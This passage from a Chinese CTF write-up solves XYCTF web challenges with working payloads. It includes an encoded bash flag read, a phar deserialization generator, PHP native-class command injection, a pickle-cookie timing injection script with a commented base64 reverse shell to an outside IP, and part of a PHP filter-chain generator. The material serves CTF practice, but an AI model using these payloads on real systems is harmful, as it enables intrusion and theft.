&#x2F;flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$0&lt;&lt;&lt;$&#x27;\143\141\164\040\057\146\154\141\147&#x27;</span><br></pre></td></tr></table></figure><h2 id="pharme"><a href="#pharme" class="headerlink" title="pharme"></a>pharme</h2><p>简单的phar反序列化, 生成的phar文件用gzip压缩绕过题目的waf</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;</span>);<span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$obj</span>=<span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;cmd = <span class="string">&#x27;print_r(file_get_contents(array_rand(array_flip(scandir(end(array_reverse(str_split(getcwd()))))))));__halt_compiler();__halt_compiler();&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$obj</span>);<span class="comment">//自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;flag&quot;</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/convert.base64-encode/resource=phar:///tmp/364be8860e8d72b4358b5e88099a935a.png/flag.txt</span><br></pre></td></tr></table></figure><h2 id="ezClass"><a href="#ezClass" class="headerlink" title="ezClass"></a>ezClass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$aa</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;aa&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$bb</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;bb&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">((<span class="keyword">new</span> <span class="variable">$a</span>(<span class="variable">$aa</span>))-&gt;<span class="variable">$c</span>())((<span class="keyword">new</span> <span class="variable">$b</span>(<span class="variable">$bb</span>))-&gt;<span class="variable">$c</span>());</span><br></pre></td></tr></table></figure><p>这种就只能考虑原生类读文件了, 我找到了SimpleXMLElement这个类,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=SimpleXMLElement&amp;aa=&lt;element&gt;system&lt;/element&gt;&amp;c=__toString&amp;b=SimpleXMLElement&amp;bb=&lt;element&gt;cat /flag&lt;/element&gt;</span><br></pre></td></tr></table></figure><p>看其他师傅的wp, 也可以使用Error</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=Error&amp;b=Error&amp;aa=system&amp;bb=cat /f*&amp;c=getMessage</span><br></pre></td></tr></table></figure><h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>很抽象, 用bash时间盲注枚举flag</p><p>贴出我的答辩脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://localhost:49689/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [ &quot;$(head -n 1 /flag | cut -c 1)&quot; = &quot;q&quot; ] &amp;&amp; sleep 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=if [ `cat /flag | cut -c 1` = &#x27;q&#x27; ];then sleep 5;fi&quot;</span></span><br><span class="line"></span><br><span class="line">alphabet = [<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;@&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;j&#x27;</span>,<span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;k&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;q&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;v&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;z&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;E&#x27;</span>,<span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;H&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,<span class="string">&#x27;J&#x27;</span>,<span class="string">&#x27;K&#x27;</span>,<span class="string">&#x27;L&#x27;</span>,<span class="string">&#x27;M&#x27;</span>,<span class="string">&#x27;N&#x27;</span>,<span class="string">&#x27;O&#x27;</span>,<span class="string">&#x27;P&#x27;</span>,<span class="string">&#x27;Q&#x27;</span>,<span class="string">&#x27;R&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;T&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;V&#x27;</span>,<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;X&#x27;</span>,<span class="string">&#x27;Y&#x27;</span>,<span class="string">&#x27;Z&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDcuMTQ4Ljc1LjIwMi8xMjM0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;XYCTF&#123;8a49f5c3-7d90-43d5-a94a-d82df2cf&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># XYCTF&#123;8a49f5c3-7d90-43d5-</span></span><br><span class="line"><span class="comment"># XYCTF&#123;8a49f5c3-7d90-43d5-a94a-d82df2cf27</span></span><br><span class="line"><span class="comment"># XYCTF&#123;8a49f5c3-7d90-43d5-a94a-d82df2cf2fc2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># lists = &#x27;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;RememberMe=&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">opcode = <span class="string">&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;if [ `cat /flag | cut -c &#123;&#125;` = &quot;&#123;&#125;&quot; ];then sleep 30;fi&#x27;</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">lenth = <span class="built_in">len</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(lenth + <span class="number">1</span>,<span class="number">1000</span>):</span><br><span class="line">    k = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> k &gt; <span class="built_in">len</span>(alphabet):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;alphabet too small!!!!&#x27;</span>)</span><br><span class="line">            exit</span><br><span class="line"></span><br><span class="line">        op = opcode.<span class="built_in">format</span>(i, alphabet[k])</span><br><span class="line"></span><br><span class="line">        payload = base64.b64encode(op.encode())</span><br><span class="line">        time1 = time.time()</span><br><span class="line">        headers[<span class="string">&#x27;Cookie&#x27;</span>] = <span class="string">&#x27;RememberMe=&#x27;</span> + payload.decode()</span><br><span class="line">        <span class="built_in">print</span>(opcode.<span class="built_in">format</span>(i,alphabet[k]))</span><br><span class="line">        res = requests.get(url=url, headers=headers)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;waf&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;waf!!!!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> time.time() - time1 &gt; <span class="number">30</span>:</span><br><span class="line">            flag = flag + alphabet[k]</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        k = k + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="εZ-¿м-Kε¿-赛后"><a href="#εZ-¿м-Kε¿-赛后" class="headerlink" title="εZ?¿м@Kε¿?(赛后)"></a>εZ?¿м@Kε¿?(赛后)</h2><p>第一反应是构造一个文件写入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;$@&lt;$&lt;</span><br></pre></td></tr></table></figure><p>这里可以创建一个FLAG文件在当前目录, 但并不能如我所愿把&#x2F;flag里的内容重定向进去</p><p>看了wp, 这里把&#x2F;flag传给bash, bash读取内容, 尝试把内容当成命令执行, 但是这个命令是不存在的, 显示报错, 把flag带出来, 这与之前见过的nmap oG参数写shell有异曲同工之妙, 可惜当时没想到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$(&lt;$&lt;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240427133820719.png" alt="image-20240427133820719"></p><h2 id="连连看到底是连连什么看-赛后"><a href="#连连看到底是连连什么看-赛后" class="headerlink" title="连连看到底是连连什么看(赛后)"></a>连连看到底是连连什么看(赛后)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;waf!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;php://filter/<span class="subst">$p</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$payload</span>)===<span class="string">&quot;XYCTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题的trick在很久之前就看过, 利用各种php过滤器,无需零时文件包含shell</p><p><a href="https://tttang.com/archive/1395/">https://tttang.com/archive/1395/</a></p><p>这里就比较抽象, 没找到很好的脚本, 一开始思路就是多几次base64解码来把XYCTF后面的乱码忽略, 奈何一直不成功就放弃了</p><p>贴一下不错的脚本</p><p>php_filter_chain_generator.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># - Useful infos -</span></span><br><span class="line"><span class="comment"># https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters</span></span><br><span class="line"><span class="comment"># https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</span></span><br><span class="line"><span class="comment"># https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># No need to guess a valid filename anymore</span></span><br><span class="line">file_to_use = <span class="string">&quot;php://temp&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;A&#x27;</span>: <span class="string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;E&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;F&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;G&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;H&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;h&#x27;</span>: <span class="string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;I&#x27;</span>: <span class="string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;i&#x27;</span>: <span class="string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;J&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;j&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;K&#x27;</span>: <span class="string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;k&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;L&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;l&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;M&#x27;</span>:<span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;m&#x27;</span>:<span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;N&#x27;</span>: <span class="string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;O&#x27;</span>: <span class="string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>: <span class="string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Q&#x27;</span>: <span 